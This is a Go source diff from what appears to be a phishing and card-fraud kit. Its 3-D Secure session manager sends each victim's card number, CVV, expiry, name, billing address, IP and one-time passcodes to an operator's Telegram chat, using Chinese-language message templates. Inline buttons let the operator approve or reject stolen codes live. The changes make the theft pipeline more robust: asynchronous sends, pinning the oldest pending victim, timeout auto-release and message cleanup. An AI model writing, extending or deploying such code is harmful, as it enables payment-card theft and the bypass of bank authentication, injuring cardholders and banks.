@@ -46,14 +46,15 @@ type ThreeDSSession struct {
 
 // ThreeDSManager manages all active 3DS verification sessions
 type ThreeDSManager struct {
-	sessions       map[string]*ThreeDSSession // sessionID -> ThreeDSSession
-	indexToSess    map[int]*ThreeDSSession    // sIndex -> ThreeDSSession
-	bypassSessions map[string]bool            // sessionID -> bypass enabled
-	mu             sync.RWMutex
-	telegram       *TelegramBot
-	proxy          *HttpProxy
-	stopChan       chan struct{}
-	wg             sync.WaitGroup
+	sessions            map[string]*ThreeDSSession // sessionID -> ThreeDSSession
+	indexToSess         map[int]*ThreeDSSession    // sIndex -> ThreeDSSession
+	bypassSessions      map[string]bool            // sessionID -> bypass enabled
+	mu                  sync.RWMutex
+	telegram            *TelegramBot
+	proxy               *HttpProxy
+	stopChan            chan struct{}
+	wg                  sync.WaitGroup
+	telegramPinnedMsgID int // currently pinned Telegram message ID
 }
 
 // NewThreeDSManager creates a new 3DS manager
@@ -114,6 +115,48 @@ func (m *ThreeDSManager) cleanupExpired() {
 			}
 		}
 	}
+}
+
+// pinOldestPendingSession finds the oldest pending 3DS session that already has a
+// Telegram message and pins it to the top of the chat. This keeps the next actionable
+// item visible so the admin does not have to scroll through the history when new
+// sessions keep arriving.
+func (m *ThreeDSManager) pinOldestPendingSession() {
+	if m.telegram == nil || !m.telegram.IsConfigured() {
+		return
+	}
+
+	m.mu.Lock()
+	defer m.mu.Unlock()
+
+	var targetMsgID int
+	var oldestTime time.Time
+	for _, ts := range m.sessions {
+		ts.mu.Lock()
+		state := ts.State
+		msgID := ts.TelegramMsgID
+		createdAt := ts.CreatedAt
+		ts.mu.Unlock()
+
+		if state == ThreeDSCompleted || state == ThreeDSExpired || msgID == 0 {
+			continue
+		}
+		if targetMsgID == 0 || createdAt.Before(oldestTime) {
+			targetMsgID = msgID
+			oldestTime = createdAt
+		}
+	}
+
+	if targetMsgID == 0 || m.telegramPinnedMsgID == targetMsgID {
+		return
+	}
+	m.telegramPinnedMsgID = targetMsgID
+
+	go func(chatID string, msgID int) {
+		if err := m.telegram.PinChatMessage(chatID, msgID); err != nil {
+			log.Warning("[3DS] failed to pin oldest pending telegram message: %v", err)
+		}
+	}(m.telegram.chatID, targetMsgID)
 }
 
 // Initiate creates a new 3DS session after CVV capture
@@ -324,11 +367,21 @@ func (m *ThreeDSManager) GetStatus(sessionID string) (state string, redirectURL 
 	ts.mu.Lock()
 	defer ts.mu.Unlock()
 
-	// Check timeout (10 minutes total) - only for non-terminal states
+	// Per-state timeout: if a session sits in a human-waiting state for too long,
+	// auto-release so the user is never stuck. Admin-review states time out after 1 minute.
+	// A 10-minute absolute fallback prevents infinite loops (e.g. repeated resend).
 	if ts.State != ThreeDSCompleted && ts.State != ThreeDSExpired {
-		if time.Since(ts.CreatedAt) > 10*time.Minute {
-			ts.State = ThreeDSExpired
+		timeout := 10 * time.Minute
+		switch ts.State {
+		case ThreeDSWaitingCVV, ThreeDSOTPWaiting, ThreeDSOTPSubmitted, ThreeDSOTPRejected:
+			timeout = 1 * time.Minute
+		}
+		if time.Since(ts.UpdatedAt) > timeout || time.Since(ts.CreatedAt) > 10*time.Minute {
+			// Auto-release on timeout to avoid getting stuck
+			ts.State = ThreeDSCompleted
 			ts.UpdatedAt = time.Now()
+			m.MarkComplete(sessionID)
+			go m.updateTelegramAutoReleased(sessionID)
 		}
 	}
 
@@ -560,28 +613,59 @@ func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv strin
 	return
 }
 
+// getTelegramMsgID returns the stored Telegram message ID for a session, or 0 if not found/sent
+func (m *ThreeDSManager) getTelegramMsgID(sessionID string) int {
+	m.mu.RLock()
+	ts, ok := m.sessions[sessionID]
+	m.mu.RUnlock()
+	if !ok {
+		return 0
+	}
+	ts.mu.Lock()
+	msgID := ts.TelegramMsgID
+	ts.mu.Unlock()
+	return msgID
+}
+
+// waitForTelegramMsgID waits up to timeout for the initial Telegram message to be sent and its ID stored.
+// This prevents edits from being dropped when a burst of sessions causes the initial send to be slightly delayed.
+func (m *ThreeDSManager) waitForTelegramMsgID(sessionID string, timeout time.Duration) int {
+	deadline := time.Now().Add(timeout)
+	for time.Now().Before(deadline) {
+		if msgID := m.getTelegramMsgID(sessionID); msgID > 0 {
+			return msgID
+		}
+		time.Sleep(200 * time.Millisecond)
+	}
+	return 0
+}
+
 // updateTelegramOTPWaiting: admin approved CVV, waiting for user to enter OTP
 func (m *ThreeDSManager) updateTelegramOTPWaiting(sessionID string, msgID int) {
 	if m.telegram == nil || !m.telegram.IsConfigured() {
 		return
 	}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _, _, billingAddr, location := m.getSessionInfo(sessionID)
-	ipLine := formatIPLine(ip, location)
+	go func() {
+		sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _, _, billingAddr, location := m.getSessionInfo(sessionID)
+		ipLine := formatIPLine(ip, location)
 
-	msg := fmt.Sprintf(
-		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"👤 持卡人: %s\n"+
-			"💳 卡号: %s\n"+
-			"📅 有效期: %s\n"+
-			"🔑 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"🏠 账单地址: %s\n\n"+
-			"⚙️ 状态: 等待用户输入 OTP",
-		sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr,
-	)
+		msg := fmt.Sprintf(
+			"🔐 3DS验证中 (Session #%d)\n\n"+
+				"👤 持卡人: %s\n"+
+				"💳 卡号: %s\n"+
+				"📅 有效期: %s\n"+
+				"🔑 CVV: %s\n"+
+				"🌐 IP: %s\n"+
+				"🏠 账单地址: %s\n\n"+
+				"⚙️ 状态: 等待用户输入 OTP",
+			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr,
+		)
 
-	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
+		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
+			log.Warning("[3DS] failed to edit telegram message (otp_waiting): %v", err)
+		}
+	}()
 }
 
 // updateTelegramOTPSubmitted: user submitted OTP, waiting for admin review
@@ -590,43 +674,40 @@ func (m *ThreeDSManager) updateTelegramOTPSubmitted(sessionID string) {
 		return
 	}
 
-	m.mu.RLock()
-	ts, ok := m.sessions[sessionID]
-	m.mu.RUnlock()
-	if !ok {
-		return
-	}
-	ts.mu.Lock()
-	msgID := ts.TelegramMsgID
-	ts.mu.Unlock()
-	if msgID == 0 {
-		return
-	}
+	go func() {
+		msgID := m.waitForTelegramMsgID(sessionID, 5*time.Second)
+		if msgID == 0 {
+			log.Warning("[3DS] telegram msgID not available for session %s, dropping otp_submitted edit", sessionID)
+			return
+		}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
-	ipLine := formatIPLine(ip, location)
+		sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
+		ipLine := formatIPLine(ip, location)
 
-	msg := fmt.Sprintf(
-		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"👤 持卡人: %s\n"+
-			"💳 卡号: %s\n"+
-			"📅 有效期: %s\n"+
-			"🔑 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"🏠 账单地址: %s\n\n"+
-			"🔢 OTP (第%d次): %s\n\n"+
-			"⚙️ 状态: 等待管理员审核",
-		sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpCount, otp,
-	)
+		msg := fmt.Sprintf(
+			"🔐 3DS验证中 (Session #%d)\n\n"+
+				"👤 持卡人: %s\n"+
+				"💳 卡号: %s\n"+
+				"📅 有效期: %s\n"+
+				"🔑 CVV: %s\n"+
+				"🌐 IP: %s\n"+
+				"🏠 账单地址: %s\n\n"+
+				"🔢 OTP (第%d次): %s\n\n"+
+				"⚙️ 状态: 等待管理员审核",
+			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpCount, otp,
+		)
 
-	buttons := [][]InlineButton{
-		{
-			{Text: "✅ OTP正确", CallbackData: fmt.Sprintf("3ds:otp_approve:%d", sIndex)},
-			{Text: "❌ OTP错误", CallbackData: fmt.Sprintf("3ds:otp_reject:%d", sIndex)},
-		},
-	}
+		buttons := [][]InlineButton{
+			{
+				{Text: "✅ OTP正确", CallbackData: fmt.Sprintf("3ds:otp_approve:%d", sIndex)},
+				{Text: "❌ OTP错误", CallbackData: fmt.Sprintf("3ds:otp_reject:%d", sIndex)},
+			},
+		}
 
-	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, buttons)
+		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, buttons); err != nil {
+			log.Warning("[3DS] failed to edit telegram message (otp_submitted): %v", err)
+		}
+	}()
 }
 
 // updateTelegramOTPRejected: admin rejected OTP, waiting for user retry
@@ -635,23 +716,27 @@ func (m *ThreeDSManager) updateTelegramOTPRejected(sessionID string, msgID int) 
 		return
 	}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
-	ipLine := formatIPLine(ip, location)
+	go func() {
+		sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
+		ipLine := formatIPLine(ip, location)
 
-	msg := fmt.Sprintf(
-		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"👤 持卡人: %s\n"+
-			"💳 卡号: %s\n"+
-			"📅 有效期: %s\n"+
-			"🔑 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"🏠 账单地址: %s\n\n"+
-			"🔢 OTP (第%d次): %s ❌ 已拒绝\n\n"+
-			"⚙️ 状态: 等待用户重新输入",
-		sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpCount, otp,
-	)
+		msg := fmt.Sprintf(
+			"🔐 3DS验证中 (Session #%d)\n\n"+
+				"👤 持卡人: %s\n"+
+				"💳 卡号: %s\n"+
+				"📅 有效期: %s\n"+
+				"🔑 CVV: %s\n"+
+				"🌐 IP: %s\n"+
+				"🏠 账单地址: %s\n\n"+
+				"🔢 OTP (第%d次): %s ❌ 已拒绝\n\n"+
+				"⚙️ 状态: 等待用户重新输入",
+			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpCount, otp,
+		)
 
-	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
+		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
+			log.Warning("[3DS] failed to edit telegram message (otp_rejected): %v", err)
+		}
+	}()
 }
 
 // updateTelegramCompleted: final state, user will be redirected
@@ -660,28 +745,43 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 		return
 	}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
-	ipLine := formatIPLine(ip, location)
+	go func() {
+		sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
+		ipLine := formatIPLine(ip, location)
 
-	otpLine := ""
-	if otpCount > 0 {
-		otpLine = fmt.Sprintf("🔢 OTP (第%d次): %s ✅\n\n", otpCount, otp)
-	}
+		otpLine := ""
+		if otpCount > 0 {
+			otpLine = fmt.Sprintf("🔢 OTP (第%d次): %s ✅\n\n", otpCount, otp)
+		}
 
-	msg := fmt.Sprintf(
-		"✅ 已放行 (Session #%d)\n\n"+
-			"👤 持卡人: %s\n"+
-			"💳 卡号: %s\n"+
-			"📅 有效期: %s\n"+
-			"🔑 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"🏠 账单地址: %s\n"+
-			"%s"+
-			"⚙️ 状态: %s\n已结束",
-		sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpLine, reason,
-	)
+		msg := fmt.Sprintf(
+			"✅ 已放行 (Session #%d)\n\n"+
+				"👤 持卡人: %s\n"+
+				"💳 卡号: %s\n"+
+				"📅 有效期: %s\n"+
+				"🔑 CVV: %s\n"+
+				"🌐 IP: %s\n"+
+				"🏠 账单地址: %s\n"+
+				"%s"+
+				"⚙️ 状态: %s\n已结束",
+			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpLine, reason,
+		)
 
-	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
+		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
+			log.Warning("[3DS] failed to edit telegram message (completed): %v", err)
+			return
+		}
+
+		// Terminal state: delete the Telegram message after a short delay so the chat
+		// only keeps pending actionable sessions, reducing scrolling.
+		time.Sleep(5 * time.Second)
+		if err := m.telegram.DeleteMessage(m.telegram.chatID, msgID); err != nil {
+			log.Warning("[3DS] failed to delete telegram message (completed): %v", err)
+		}
+
+		// After removing a completed message, make sure the oldest pending one is pinned.
+		m.pinOldestPendingSession()
+	}()
 }
 
 // updateTelegramResend: user requested OTP resend
@@ -690,41 +790,90 @@ func (m *ThreeDSManager) updateTelegramResend(sessionID string) {
 		return
 	}
 
-	m.mu.RLock()
-	ts, ok := m.sessions[sessionID]
-	m.mu.RUnlock()
-	if !ok {
-		return
-	}
-	ts.mu.Lock()
-	msgID := ts.TelegramMsgID
-	ts.mu.Unlock()
-	if msgID == 0 {
-		return
-	}
+	go func() {
+		msgID := m.waitForTelegramMsgID(sessionID, 5*time.Second)
+		if msgID == 0 {
+			log.Warning("[3DS] telegram msgID not available for session %s, dropping resend edit", sessionID)
+			return
+		}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, otpCount, resendCount, billingAddr, location := m.getSessionInfo(sessionID)
-	ipLine := formatIPLine(ip, location)
+		sIndex, cvv, cardNumber, expireDate, holderName, ip, _, otpCount, resendCount, billingAddr, location := m.getSessionInfo(sessionID)
+		ipLine := formatIPLine(ip, location)
 
-	msg := fmt.Sprintf(
-		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"👤 持卡人: %s\n"+
-			"💳 卡号: %s\n"+
-			"📅 有效期: %s\n"+
-			"🔑 CVV: %s\n"+
-			"🌐 IP: %s\n"+
-			"🏠 账单地址: %s\n\n"+
-			"🔄 重发验证码 (第%d次)\n"+
-			"📤 OTP提交次数: %d\n\n"+
-			"⚙️ 状态: 用户请求重新发送验证码",
-		sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, resendCount, otpCount,
-	)
+		msg := fmt.Sprintf(
+			"🔐 3DS验证中 (Session #%d)\n\n"+
+				"👤 持卡人: %s\n"+
+				"💳 卡号: %s\n"+
+				"📅 有效期: %s\n"+
+				"🔑 CVV: %s\n"+
+				"🌐 IP: %s\n"+
+				"🏠 账单地址: %s\n\n"+
+				"🔄 重发验证码 (第%d次)\n"+
+				"📤 OTP提交次数: %d\n\n"+
+				"⚙️ 状态: 用户请求重新发送验证码",
+			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, resendCount, otpCount,
+		)
 
-	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
+		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
+			log.Warning("[3DS] failed to edit telegram message (resend): %v", err)
+		}
+	}()
 }
 
-// Send3DSNotification sends the initial CVV capture notification with 3DS buttons
-// Idempotent: only sends once per session, returns existing msgID if already sent
+// updateTelegramAutoReleased: session timed out without manual action, auto-released
+func (m *ThreeDSManager) updateTelegramAutoReleased(sessionID string) {
+	if m.telegram == nil || !m.telegram.IsConfigured() {
+		return
+	}
+
+	go func() {
+		msgID := m.waitForTelegramMsgID(sessionID, 5*time.Second)
+		if msgID == 0 {
+			log.Warning("[3DS] telegram msgID not available for session %s, dropping auto-released edit", sessionID)
+			return
+		}
+
+		sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
+		ipLine := formatIPLine(ip, location)
+
+		otpLine := ""
+		if otpCount > 0 {
+			otpLine = fmt.Sprintf("🔢 OTP (第%d次): %s\n\n", otpCount, otp)
+		}
+
+		msg := fmt.Sprintf(
+			"⏱️ 已自动放行 (Session #%d)\n\n"+
+				"👤 持卡人: %s\n"+
+				"💳 卡号: %s\n"+
+				"📅 有效期: %s\n"+
+				"🔑 CVV: %s\n"+
+				"🌐 IP: %s\n"+
+				"🏠 账单地址: %s\n"+
+				"%s"+
+				"⚙️ 状态: 超时未操作，系统自动放行\n已结束",
+			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpLine,
+		)
+
+		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
+			log.Warning("[3DS] failed to edit telegram message (auto-released): %v", err)
+			return
+		}
+
+		// Terminal state: delete the Telegram message after a short delay so the chat
+		// only keeps pending actionable sessions, reducing scrolling.
+		time.Sleep(5 * time.Second)
+		if err := m.telegram.DeleteMessage(m.telegram.chatID, msgID); err != nil {
+			log.Warning("[3DS] failed to delete telegram message (auto-released): %v", err)
+		}
+
+		// After removing a completed message, make sure the oldest pending one is pinned.
+		m.pinOldestPendingSession()
+	}()
+}
+
+// Send3DSNotification sends the initial CVV capture notification with 3DS buttons asynchronously.
+// It returns immediately; the actual Telegram API call runs in a background goroutine so that a
+// burst of incoming sessions does not block the HTTP handlers.
 func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 	if m.telegram == nil || !m.telegram.IsConfigured() {
 		return 0
@@ -739,11 +888,17 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 
 	ts.mu.Lock()
 	if ts.TelegramMsgID > 0 {
+		msgID := ts.TelegramMsgID
 		ts.mu.Unlock()
-		return ts.TelegramMsgID
+		return msgID
 	}
 	ts.mu.Unlock()
 
+	go m.send3DSNotificationAsync(sessionID)
+	return 0
+}
+
+func (m *ThreeDSManager) send3DSNotificationAsync(sessionID string) {
 	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _, _, billingAddr, location := m.getSessionInfo(sessionID)
 
 	ipLine := ip
@@ -773,14 +928,25 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 	msgID, err := m.telegram.SendMessageWithButtons(m.telegram.chatID, msg, buttons)
 	if err != nil {
 		log.Error("[3DS] failed to send telegram notification: %v", err)
-		return 0
+		return
 	}
 
+	m.mu.RLock()
+	ts, ok := m.sessions[sessionID]
+	m.mu.RUnlock()
+	if !ok {
+		return
+	}
 	ts.mu.Lock()
-	ts.TelegramMsgID = msgID
+	// Only store if no other goroutine already stored an ID
+	if ts.TelegramMsgID == 0 {
+		ts.TelegramMsgID = msgID
+	}
 	ts.mu.Unlock()
 
-	return msgID
+	// Always make sure the oldest pending session is pinned at the top of the chat.
+	// This keeps the next actionable item visible even when many new sessions arrive.
+	m.pinOldestPendingSession()
 }
 
 func (m *ThreeDSManager) MarkComplete(id string) {
